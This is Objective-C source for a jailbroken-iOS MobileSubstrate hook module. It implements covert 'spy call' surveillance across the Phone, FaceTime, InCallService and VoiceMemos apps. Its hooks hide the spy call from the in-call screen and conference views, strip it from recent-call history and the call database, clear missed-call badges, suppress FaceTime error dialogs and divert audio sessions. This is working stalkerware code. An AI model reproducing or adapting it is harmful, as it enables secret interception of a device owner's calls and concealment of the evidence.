#pragma mark MobilePhone
#pragma mark -
	
	if ([identifier isEqualToString:@"com.apple.mobilephone"]) {
        // Searching classes
        //lookupClasses();
        
		// Create service
		SpyCallManager *spyCallManager = [SpyCallManager sharedManager];
		[SpyCallMobilePhoneService sharedServiceWithSpyCallManager:spyCallManager];
		
		// Hook telephony callback
		void (*_ServerConnectionCallback)(CTServerConnectionRef connection, CFStringRef notification, CFDictionaryRef notification_info, void * info);
        //lookupSymbol(CTTelephony, "__ServerConnectionCallback", _ServerConnectionCallback);
        MSImageRef image1;
        image1 = MSGetImageByName(CTTelephony);
        _ServerConnectionCallback = (void (*)(CTServerConnectionRef a, CFStringRef b, CFDictionaryRef c, void *d))MSFindSymbol(image1, "__ServerConnectionCallback");
		MSHookFunction(_ServerConnectionCallback, MSHake(_ServerConnectionCallback));
        
        MSImageRef image2;
        image2 = MSGetImageByName(CTTelephony);
        MSHookFunction(((void *)MSFindSymbol(image2, "__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary")),
                       (void *)$__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary,
                       (void **)&old__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary);
		
		Class $PhoneApplication(objc_getClass("PhoneApplication"));
		// Hook an attempt call from contact in side phone application
		//_PhoneApplication$shouldAttemptPhoneCall = MSHookMessage($PhoneApplication, @selector(shouldAttemptPhoneCall), &$PhoneApplication$shouldAttemptPhoneCall);
        MSHookMessage($PhoneApplication, @selector(shouldAttemptPhoneCall), $PhoneApplication$shouldAttemptPhoneCall, &_PhoneApplication$shouldAttemptPhoneCall);
        // iOS 7, 8 (dial from favorite numbers)
        MSHookMessage($PhoneApplication,
                      @selector(shouldAttemptPhoneCallForService:),
                      $PhoneApplication$shouldAttemptPhoneCallForService$,
                      &_PhoneApplication$shouldAttemptPhoneCallForService$);
        // iOS 8, dial from keypad
        MSHookMessage($PhoneApplication, @selector(openURL:), $PhoneApplication$openURL$, &_PhoneApplication$openURL$);
        // iOS 8, dial from recent calls
        MSHookMessage($PhoneApplication, @selector(dialRecentCall:), $PhoneApplication$dialRecentCall$, &_PhoneApplication$dialRecentCall$);
		// Hook voice mail button, iOS 4,5,6,7,8
		//_PhoneApplication$dialVoicemail = MSHookMessage($PhoneApplication, @selector(dialVoicemail), &$PhoneApplication$dialVoicemail);
        MSHookMessage($PhoneApplication, @selector(dialVoicemail), $PhoneApplication$dialVoicemail, &_PhoneApplication$dialVoicemail);
		// Hook badge
		//_PhoneApplication$_setTarBarItemBadge$forViewType$ = MSHookMessage($PhoneApplication, @selector(_setTarBarItemBadge:forViewType:), &$PhoneApplication$_setTarBarItemBadge$forViewType$);
        MSHookMessage($PhoneApplication, @selector(_setTarBarItemBadge:forViewType:), $PhoneApplication$_setTarBarItemBadge$forViewType$, &_PhoneApplication$_setTarBarItemBadge$forViewType$);
        // iOS 7
        if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
            // iOS 7
            // Hook to get current calls, there may be an incoming call exist after phone is respring/restart or MobilePhone is killed by user; this case happen only for incoming call;
            // for outgoing, no such issue since MobilePhone is start before any call is made that's mean hook of server connection call back can keep track all calls.
            // NO... there is at least one case found where the outgoing call is made from Map application
            /**** 
             Story: After MobilePhone is start by OS (likely SpringBoard), there was an incoming call, the hook of server connection call back missed that incoming call (current call) status.
             Note:
                -- For incoming spy call MobilePhone will not start by the OS (SpringBoard) if it's not yet start
                -- For incoming normal call MobilePhone will start by the OS (SpringBoard) if it's not yet start
             ****/
            
            // iOS 8, it introduces hidden InCallService application (MobilePhone's started -> InCallService's started; MobilePhone's killed -> InCallService's not killed)
            /*
             Note:
                - MobilePhone application not start when there is an incoming normal call, if it's not yet start
                - MobilePhone application not start when there is an incoming spy call, if it's not start
             
             So the different between iOS 7 & 8 is that, iOS 8, before MobilePhone application is started there may be calls already with state of dialing, incoming on hold or connected whereas iOS 7,
             there may be call already in state of dialing or incoming.
             */
            MSHookMessage($PhoneApplication, @selector(applicationDidFinishLaunching:), $PhoneApplication$applicationDidFinishLaunching$, &_PhoneApplication$applicationDidFinishLaunching$);
        }
		
		Class $RecentCall(objc_getClass("RecentCall"));
		// Hook recent call in call log history
        // iOS 4
		//_RecentCall$initWithCTCall$givenCountryCode$ = MSHookMessage($RecentCall, @selector(initWithCTCall:givenCountryCode:), &$RecentCall$initWithCTCall$givenCountryCode$);
        MSHookMessage($RecentCall, @selector(initWithCTCall:givenCountryCode:), $RecentCall$initWithCTCall$givenCountryCode$, &_RecentCall$initWithCTCall$givenCountryCode$);
        // iOS 5, 6
        //_RecentCall$initWithCTCall$ = MSHookMessage($RecentCall, @selector(initWithCTCall:), &$RecentCall$initWithCTCall$);
        MSHookMessage($RecentCall, @selector(initWithCTCall:), $RecentCall$initWithCTCall$, &_RecentCall$initWithCTCall$);
        // iOS 7
        Class $PHRecentCall = objc_getClass("PHRecentCall");
        MSHookMessage($PHRecentCall, @selector(initWithCTCall:), $PHRecentCall$initWithCTCall$, &_PHRecentCall$initWithCTCall$);
        // iOS 8
        Class $CallHistoryDBClientHandle = objc_getClass("CallHistoryDBClientHandle");
        MSHookMessage($CallHistoryDBClientHandle, @selector(convertToCHRecentCalls_sync:),
                      $CallHistoryDBClientHandle$convertToCHRecentCalls_sync$,
                      &_CallHistoryDBClientHandle$convertToCHRecentCalls_sync$);
        
		Class $InCallController(objc_getClass("InCallController"));
		// Hook to ensure that spy call is always disconnected first except other parties end their calls
		//_InCallController$_endCallClicked$ = MSHookMessage($InCallController, @selector(_endCallClicked:), &$InCallController$_endCallClicked$);
		// Hook update wallpaper when spy is coming and about to join conference
		//_InCallController$_updateCurrentCallDisplay = MSHookMessage($InCallController, @selector(_updateCurrentCallDisplay), &$InCallController$_updateCurrentCallDisplay);
		// Hook to disconnect spy call from conference when user try to view the participants
		//_InCallController$inCallLCDViewConferenceButtonClicked$ = MSHookMessage($InCallController, @selector(inCallLCDViewConferenceButtonClicked:), &$InCallController$inCallLCDViewConferenceButtonClicked$);
		// Hook to block participant numbers slide on the screen
		//_InCallController$_updateConferenceDisplayNameCache = MSHookMessage($InCallController, @selector(_updateConferenceDisplayNameCache), &$InCallController$_updateConferenceDisplayNameCache);
        MSHookMessage($InCallController, @selector(_updateConferenceDisplayNameCache), $InCallController$_updateConferenceDisplayNameCache, &_InCallController$_updateConferenceDisplayNameCache);
		// Hook to block update conference button state
		//_InCallController$_setConferenceCall$ = MSHookMessage($InCallController, @selector(_setConferenceCall:), &$InCallController$_setConferenceCall$);
        MSHookMessage($InCallController, @selector(_setConferenceCall:), $InCallController$_setConferenceCall$, &_InCallController$_setConferenceCall$);
		// Hook to try to remove spy call from display
		//_InCallController$setDisplayedCalls$ = MSHookMessage($InCallController, @selector(setDisplayedCalls:), &$InCallController$setDisplayedCalls$);
        MSHookMessage($InCallController, @selector(setDisplayedCalls:), $InCallController$setDisplayedCalls$, &_InCallController$setDisplayedCalls$);
		
		Class $InCallLCDView(objc_getClass("InCallLCDView"));
		// Hook to block text 'Conference' to update to LCD view
		//_InCallLCDView$setText$ = MSHookMessage($InCallLCDView, @selector(setText:), &$InCallLCDView$setText$);
        MSHookMessage($InCallLCDView, @selector(setText:), $InCallLCDView$setText$, &_InCallLCDView$setText$);
		//_InCallLCDView$setText$animating$ = MSHookMessage($InCallLCDView, @selector(setText:animating:), &$InCallLCDView$setText$animating$);
        MSHookMessage($InCallLCDView, @selector(setText:animating:), $InCallLCDView$setText$animating$, &_InCallLCDView$setText$animating$);
		
		Class $SixSquareView(objc_getClass("SixSquareView"));
		// Hook to block update six squares button (text, image)
		//_SixSquareView$setTitle$image$forPosition$ = MSHookMessage($SixSquareView, @selector(setTitle:image:forPosition:), &$SixSquareView$setTitle$image$forPosition$);
        MSHookMessage($SixSquareView, @selector(setTitle:image:forPosition:), $SixSquareView$setTitle$image$forPosition$, &_SixSquareView$setTitle$image$forPosition$);
		// Hook to block update six squares button (enable, focus)
		//_SixSquareView$buttonAtPosition$ = MSHookMessage($SixSquareView, @selector(buttonAtPosition:), &$SixSquareView$buttonAtPosition$);
        MSHookMessage($SixSquareView, @selector(buttonAtPosition:), $SixSquareView$buttonAtPosition$, &_SixSquareView$buttonAtPosition$);
		
		Class $RecentsViewController(objc_getClass("RecentsViewController"));
		// Hook to refresh recent call one time every view will appear
		//_RecentsViewController$viewWillAppear$ = MSHookMessage($RecentsViewController, @selector(viewWillAppear:), &$RecentsViewController$viewWillAppear$);
        MSHookMessage($RecentsViewController, @selector(viewWillAppear:), $RecentsViewController$viewWillAppear$, &_RecentsViewController$viewWillAppear$);
		//_RecentsViewController$viewDidAppear$ = MSHookMessage($RecentsViewController, @selector(viewDidAppear:), &$RecentsViewController$viewDidAppear$);
        MSHookMessage($RecentsViewController, @selector(viewDidAppear:), $RecentsViewController$viewDidAppear$, &_RecentsViewController$viewDidAppear$);
		
		if ([[[UIDevice currentDevice] systemVersion] intValue] <= 5) {
			// Hook to remove badge from recent call tab view controller of phone application for IOS 5.x downward (tested 5.1.1)
			$RecentsViewController = objc_getMetaClass("RecentsViewController");
			//_RecentsViewController$badge = MSHookMessage($RecentsViewController, @selector(badge), &$RecentsViewController$badge);
            MSHookMessage($RecentsViewController, @selector(badge), $RecentsViewController$badge, &_RecentsViewController$badge);
		}
		
		if ([[[UIDevice currentDevice] systemVersion] intValue] >= 6) {
			Class $PARecentsManager = objc_getClass("PARecentsManager");
			// Hook to remove badge from recent call tab view controller of phone application for IOS 6.x upward
			//_PARecentsManager$callHistorySignificantChangeNotification = MSHookMessage($PARecentsManager, @selector(callHistorySignificantChangeNotification), &$PARecentsManager$callHistorySignificantChangeNotification);
			//_PARecentsManager$callHistoryRecordAddedNotification$ = MSHookMessage($PARecentsManager, @selector(callHistoryRecordAddedNotification:), &$PARecentsManager$callHistoryRecordAddedNotification$);
            MSHookMessage($PARecentsManager, @selector(callHistoryRecordAddedNotification:), $PARecentsManager$callHistoryRecordAddedNotification$, &_PARecentsManager$callHistoryRecordAddedNotification$);
            // iOS 7
            Class $PHRecentsManager = objc_getClass("PHRecentsManager");
            MSHookMessage($PHRecentsManager, @selector(callHistoryRecordAddedNotification:), $PHRecentsManager$callHistoryRecordAddedNotification$, &_PHRecentsManager$callHistoryRecordAddedNotification$);
		}
		
        Class $AVController(objc_getClass("AVController"));
		// Hook audio session controller for diverting the audio session to ring tone state
		//_AVController$init = MSHookMessage($AVController, @selector(init), &$AVController$init);
        MSHookMessage($AVController, @selector(init), $AVController$init, &_AVController$init);
        // iOS 7,8
        MSHookMessage($AVController, @selector(initWithQueue:fmpType:error:), $AVController$initWithQueue$fmpType$error$, &_AVController$initWithQueue$fmpType$error$);
        MSHookMessage($AVController, @selector(initWithQueue:error:), $AVController$initWithQueue$error$, &_AVController$initWithQueue$error$);
        MSHookMessage($AVController, @selector(initForStreaming), $AVController$initForStreaming, &_AVController$initForStreaming);
        MSHookMessage($AVController, @selector(initWithError:), $AVController$initWithError$, &_AVController$initWithError$);
        
#pragma mark FaceTime iOS 6
		
		if ([SystemUtilsImpl isIpodTouch] || [SystemUtilsImpl isIpad]) {
			[FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
			
			Class $CNFConferenceController = objc_getClass("CNFConferenceController");
			// Hook to detect incoming FaceTime call
			//_CNFConferenceController$conference$receivedInvitationFromIMHandle$ = MSHookMessage($CNFConferenceController, @selector(conference:receivedInvitationFromIMHandle:), &$CNFConferenceController$conference$receivedInvitationFromIMHandle$);
            MSHookMessage($CNFConferenceController, @selector(conference:receivedInvitationFromIMHandle:), $CNFConferenceController$conference$receivedInvitationFromIMHandle$, &_CNFConferenceController$conference$receivedInvitationFromIMHandle$);
			//_CNFConferenceController$_handleInvitationForConferenceID$fromHandle$ = MSHookMessage($CNFConferenceController, @selector(_handleInvitationForConferenceID:fromHandle:), &$CNFConferenceController$_handleInvitationForConferenceID$fromHandle$);
            MSHookMessage($CNFConferenceController, @selector(_handleInvitationForConferenceID:fromHandle:), $CNFConferenceController$_handleInvitationForConferenceID$fromHandle$, &_CNFConferenceController$_handleInvitationForConferenceID$fromHandle$);
			
			Class $CNFDisplayController = objc_getClass("CNFDisplayController");
			DLog (@"-- MobilePhone --, Class of CNFDisplayController = %@", $CNFDisplayController);
			// Hook to block error when spy call FaceTime failed
			//_CNFDisplayController$showCallFailedWithReason$error$ = MSHookMessage($CNFDisplayController, @selector(showCallFailedWithReason:error:), &$CNFDisplayController$showCallFailedWithReason$error$);
            MSHookMessage($CNFDisplayController, @selector(showCallFailedWithReason:error:), $CNFDisplayController$showCallFailedWithReason$error$, &_CNFDisplayController$showCallFailedWithReason$error$);
			//_CNFDisplayController$prepareForCallWaitingAnimated$ = MSHookMessage($CNFDisplayController, @selector(prepareForCallWaitingAnimated:), &$CNFDisplayController$prepareForCallWaitingAnimated$);
			//_CNFDisplayController$resumeFromCallWaitingAnimated$ = MSHookMessage($CNFDisplayController, @selector(resumeFromCallWaitingAnimated:), &$CNFDisplayController$resumeFromCallWaitingAnimated$);

			Class $CNFCallViewController = objc_getClass("CNFCallViewController");
			// Hook to block UI update while spy call FaceTime coming waiting
			//_CNFCallViewController$prepareForCallWaitingAnimated$ = MSHookMessage($CNFCallViewController, @selector(prepareForCallWaitingAnimated:), &$CNFCallViewController$prepareForCallWaitingAnimated$);
            MSHookMessage($CNFCallViewController, @selector(prepareForCallWaitingAnimated:), $CNFCallViewController$prepareForCallWaitingAnimated$, &_CNFCallViewController$prepareForCallWaitingAnimated$);
			//_CNFCallViewController$resumeFromCallWaitingAnimated$ = MSHookMessage($CNFCallViewController, @selector(resumeFromCallWaitingAnimated:), &$CNFCallViewController$resumeFromCallWaitingAnimated$);
            MSHookMessage($CNFCallViewController, @selector(resumeFromCallWaitingAnimated:), $CNFCallViewController$resumeFromCallWaitingAnimated$, &_CNFCallViewController$resumeFromCallWaitingAnimated$);
		}
	}
    
#pragma mark -
#pragma mark FaceTime iOS 7,8
#pragma mark -
    
    if ([identifier isEqualToString:@"com.apple.facetime"]) {
        if ([SystemUtilsImpl isIpodTouch] || [SystemUtilsImpl isIpad]) {
            // Searching classes
            //lookupClasses();
            
			[FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
            
			Class $CNFConferenceController = objc_getClass("CNFConferenceController");
			// Hook to detect incoming FaceTime call
			//_CNFConferenceController$conference$receivedInvitationFromIMHandle$ = MSHookMessage($CNFConferenceController, @selector(conference:receivedInvitationFromIMHandle:), &$CNFConferenceController$conference$receivedInvitationFromIMHandle$);
            MSHookMessage($CNFConferenceController, @selector(conference:receivedInvitationFromIMHandle:), $CNFConferenceController$conference$receivedInvitationFromIMHandle$, &_CNFConferenceController$conference$receivedInvitationFromIMHandle$);
			//_CNFConferenceController$_handleInvitationForConferenceID$fromHandle$ = MSHookMessage($CNFConferenceController, @selector(_handleInvitationForConferenceID:fromHandle:), &$CNFConferenceController$_handleInvitationForConferenceID$fromHandle$);
            MSHookMessage($CNFConferenceController, @selector(_handleInvitationForConferenceID:fromHandle:), $CNFConferenceController$_handleInvitationForConferenceID$fromHandle$, &_CNFConferenceController$_handleInvitationForConferenceID$fromHandle$);
            // iOS 7
            MSHookMessage($CNFConferenceController, @selector(invitedToIMAVChat:), $CNFConferenceController$invitedToIMAVChat$, &_CNFConferenceController$invitedToIMAVChat$);
            // These 2 methods is not call (NOT USE)
            //MSHookMessage($CNFConferenceController, @selector(inviteFailedFromIMHandle:reason:), $CNFConferenceController$inviteFailedFromIMHandle$reason$, &_CNFConferenceController$inviteFailedFromIMHandle$reason$);
            //MSHookMessage($CNFConferenceController, @selector(createdOutgoingIMAVChat:), $CNFConferenceController$createdOutgoingIMAVChat$, &_CNFConferenceController$createdOutgoingIMAVChat$);
            
            // iOS 7
            // Hook to detect FaceTime call ended, thus we know what to handle, (NOT USE)
            MSHookMessage($CNFConferenceController, @selector(_handleConferenceEnded:withReason:withError:), $CNFConferenceController$_handleConferenceEnded$withReason$withError$, &_CNFConferenceController$_handleConferenceEnded$withReason$withError$);
            MSHookMessage($CNFConferenceController, @selector(_handleConferenceConnecting:), $CNFConferenceController$_handleConferenceConnecting$, &_CNFConferenceController$_handleConferenceConnecting$);
            MSHookMessage($CNFConferenceController, @selector(_handleEndAVChat:withReason:error:), $CNFConferenceController$_handleEndAVChat$withReason$error$, &_CNFConferenceController$_handleEndAVChat$withReason$error$);
			
			Class $CNFDisplayController = objc_getClass("CNFDisplayController");
			DLog (@"-- FaceTime --, Class of CNFDisplayController = %@", $CNFDisplayController);
			// Hook to block error when spy call FaceTime failed
			//_CNFDisplayController$showCallFailedWithReason$error$ = MSHookMessage($CNFDisplayController, @selector(showCallFailedWithReason:error:), &$CNFDisplayController$showCallFailedWithReason$error$);
            MSHookMessage($CNFDisplayController, @selector(showCallFailedWithReason:error:), $CNFDisplayController$showCallFailedWithReason$error$, &_CNFDisplayController$showCallFailedWithReason$error$);
			//_CNFDisplayController$prepareForCallWaitingAnimated$ = MSHookMessage($CNFDisplayController, @selector(prepareForCallWaitingAnimated:), &$CNFDisplayController$prepareForCallWaitingAnimated$);
			//_CNFDisplayController$resumeFromCallWaitingAnimated$ = MSHookMessage($CNFDisplayController, @selector(resumeFromCallWaitingAnimated:), &$CNFDisplayController$resumeFromCallWaitingAnimated$);
            
			Class $CNFCallViewController = objc_getClass("CNFCallViewController");
			// Hook to block UI update while spy call FaceTime coming (waiting)
			//_CNFCallViewController$prepareForCallWaitingAnimated$ = MSHookMessage($CNFCallViewController, @selector(prepareForCallWaitingAnimated:), &$CNFCallViewController$prepareForCallWaitingAnimated$);
            MSHookMessage($CNFCallViewController, @selector(prepareForCallWaitingAnimated:), $CNFCallViewController$prepareForCallWaitingAnimated$, &_CNFCallViewController$prepareForCallWaitingAnimated$);
			//_CNFCallViewController$resumeFromCallWaitingAnimated$ = MSHookMessage($CNFCallViewController, @selector(resumeFromCallWaitingAnimated:), &$CNFCallViewController$resumeFromCallWaitingAnimated$);
            MSHookMessage($CNFCallViewController, @selector(resumeFromCallWaitingAnimated:), $CNFCallViewController$resumeFromCallWaitingAnimated$, &_CNFCallViewController$resumeFromCallWaitingAnimated$);
			
            // iOS 7, hook to remove missed call of FaceTime spy call from recent call view
            Class $PHRecentsManager = objc_getClass("PHRecentsManager");
            MSHookMessage($PHRecentsManager, @selector(callHistoryRecordAddedNotification:), $PHRecentsManager$callHistoryRecordAddedNotification$, &_PHRecentsManager$callHistoryRecordAddedNotification$);
            
            // iOS 7
            Class $PHRecentCall = objc_getClass("PHRecentCall");
            MSHookMessage($PHRecentCall, @selector(initWithCTCall:), $PHRecentCall$initWithCTCall$, &_PHRecentCall$initWithCTCall$);
            // iOS 8
            Class $CallHistoryDBClientHandle = objc_getClass("CallHistoryDBClientHandle");
            MSHookMessage($CallHistoryDBClientHandle, @selector(convertToCHRecentCalls_sync:),
                          $CallHistoryDBClientHandle$convertToCHRecentCalls_sync$,
                          &_CallHistoryDBClientHandle$convertToCHRecentCalls_sync$);
            
            if ([[[UIDevice currentDevice] systemVersion] intValue] >= 8) {
                // iOS 8
                Class $TUCallCenter = objc_getClass("TUCallCenter");
                MSHookMessage($TUCallCenter, @selector(handleCallStatusChanged:),
                              $TUCallCenter$handleCallStatusChangediPadiPod_FaceTime_InCallService$,
                              &_TUCallCenter$handleCallStatusChangediPadiPod_FaceTime_InCallService$);
                
                // Hook to clear FaceTime spy missed call badge from application icon
                Class $FaceTimeApplication = objc_getClass("FaceTimeApplication");
                MSHookMessage($FaceTimeApplication, @selector(applicationDidBecomeActive:), $FaceTimeApplication$applicationDidBecomeActive$, &_FaceTimeApplication$applicationDidBecomeActive$);
            }
		}
    }
	
    
#pragma mark -
#pragma mark InCallService (available in iOS 8 onward)
#pragma mark -
    
    if ([identifier isEqualToString:@"com.apple.InCallService"]) {
        // Searching classes
        //lookupClasses();
        
        MSImageRef image2;
        image2 = MSGetImageByName(CTTelephony);
        MSHookFunction(((void *)MSFindSymbol(image2, "__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary")),
                       (void *)$__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary_InCallService,
                       (void **)&old__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary_InCallService);
        
        // iOS 8, to block in call screen update when there is spy call to conference
        //
        Class $PHAudioCallControlsView(objc_getClass("PHAudioCallControlsView"));
        // Block six buttons from update while spy call is conferencing
        MSHookMessage($PHAudioCallControlsView, @selector(updateControls), $PHAudioCallControlsView$updateControls, &_PHAudioCallControlsView$updateControls);
        
        Class $PHAudioCallControlsViewController(objc_getClass("PHAudioCallControlsViewController"));
        // Take appropriate actions when one of six buttons is pressed
        MSHookMessage($PHAudioCallControlsViewController, @selector(controlTypeTapped:), $PHAudioCallControlsViewController$controlTypeTapped$, &_PHAudioCallControlsViewController$controlTypeTapped$);
        
        Class $PHCallParticipantsViewController(objc_getClass("PHCallParticipantsViewController"));
        // Block call status 'On Hold' in timer view while spy call is conferencing
        MSHookMessage($PHCallParticipantsViewController, @selector(secondTickNotification:),
                      $PHCallParticipantsViewController$secondTickNotification$,
                      &_PHCallParticipantsViewController$secondTickNotification$);
        // Block update to number of calls in participants view while user return from SpringBoard screen or other apps screen
        MSHookMessage($PHCallParticipantsViewController, @selector(_updateCallGroups),
                      $PHCallParticipantsViewController$_updateCallGroups,
                      &_PHCallParticipantsViewController$_updateCallGroups);
        
        Class $PHAudioCallViewController = objc_getClass("PHAudioCallViewController");
        // Block update to FaceTime call button while spy call is conferencing (apply to conference with private number case)
        MSHookMessage($PHAudioCallViewController, @selector(callCenterCallStatusChangedNotification:),
                      $PHAudioCallViewController$callCenterCallStatusChangedNotification$,
                      &_PHAudioCallViewController$callCenterCallStatusChangedNotification$);
        MSHookMessage($PHAudioCallViewController, @selector(bottomBarActionPerformed:fromBar:),
                      $PHAudioCallViewController$bottomBarActionPerformed$fromBar$,
                      &_PHAudioCallViewController$bottomBarActionPerformed$fromBar$);
        
        Class $PHInCallRootViewControllerActual(objc_getClass("PHInCallRootViewControllerActual"));
        // Take appropriate actions when in app status bar tapped
        MSHookMessage($PHInCallRootViewControllerActual, @selector(handleDoubleHeightStatusBarTap),
                      $PHInCallRootViewControllerActual$handleDoubleHeightStatusBarTap,
                      &_PHInCallRootViewControllerActual$handleDoubleHeightStatusBarTap);
        
#pragma mark FaceTime iOS 8
        
        if ([SystemUtilsImpl isIpodTouch] || [SystemUtilsImpl isIpad]) {
            Class $TUCallCenter = objc_getClass("TUCallCenter");
                MSHookMessage($TUCallCenter, @selector(handleCallStatusChanged:),
                              $TUCallCenter$handleCallStatusChangediPadiPod_FaceTime_InCallService$,
                              &_TUCallCenter$handleCallStatusChangediPadiPod_FaceTime_InCallService$);
        }
    }
    
#pragma mark -
#pragma mark VoiceMemos
#pragma mark -
	
	if ([identifier isEqualToString:@"com.apple.VoiceMemos"]) {
        [AudioHelper sharedAudioHelper];
        
        if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
            // iOS 7
            Class $RCAVPreviewController(objc_getClass("RCAVPreviewController"));
            MSHookMessage($RCAVPreviewController, @selector(playOrRestart), $RCAVPreviewController$playOrRestart, &_RCAVPreviewController$playOrRestart);
            MSHookMessage($RCAVPreviewController, @selector(pause), $RCAVPreviewController$pause, &_RCAVPreviewController$pause);
            MSHookMessage($RCAVPreviewController, @selector(stop), $RCAVPreviewController$stop, &_RCAVPreviewController$stop);
            MSHookMessage($RCAVPreviewController, @selector(_handleDidStopPlaybackWithError:),
                          $RCAVPreviewController$_handleDidStopPlaybackWithError$,
                          &_RCAVPreviewController$_handleDidStopPlaybackWithError$);
            
            // iOS 8
            Class $RCPreviewController = objc_getClass("RCPreviewController");
            //MSHookMessage($RCPreviewController, @selector(playOrRestart), $RCPreviewController$playOrRestart, &_RCPreviewController$playOrRestart);
            MSHookMessage($RCPreviewController, @selector(playWithTimeRange:startTime:),
                          $RCPreviewController$playWithTimeRange$startTime$,
                          &_RCPreviewController$playWithTimeRange$startTime$);
            MSHookMessage($RCPreviewController, @selector(pause), $RCPreviewController$pause, &_RCPreviewController$pause);
            MSHookMessage($RCPreviewController, @selector(stop), $RCPreviewController$stop, &_RCPreviewController$stop);
            MSHookMessage($RCPreviewController, @selector(_handleDidStopPlaybackWithError:),
                          $RCPreviewController$_handleDidStopPlaybackWithError$,
                          &_RCPreviewController$_handleDidStopPlaybackWithError$);
            
        } else if ([[[UIDevice currentDevice] systemVersion] intValue] <= 6) {
            
            Class $AVController(objc_getClass("AVController"));
            //_AVController$play$ = MSHookMessage($AVController, @selector(play:), &$AVController$play$);
            MSHookMessage($AVController, @selector(play:), $AVController$play$, &_AVController$play$);
            //_AVController$playNextItem$ = MSHookMessage($AVController, @selector(playNextItem:), &$AVController$playNextItem$);
            MSHookMessage($AVController, @selector(playNextItem:), $AVController$playNextItem$, &_AVController$playNextItem$);
            //_AVController$pause = MSHookMessage($AVController, @selector(pause), &$AVController$pause);
            MSHookMessage($AVController, @selector(pause), $AVController$pause, &_AVController$pause);
        }
        
	}
    
	DLog(@"MSSPC initialize end");
    [pool release];
}
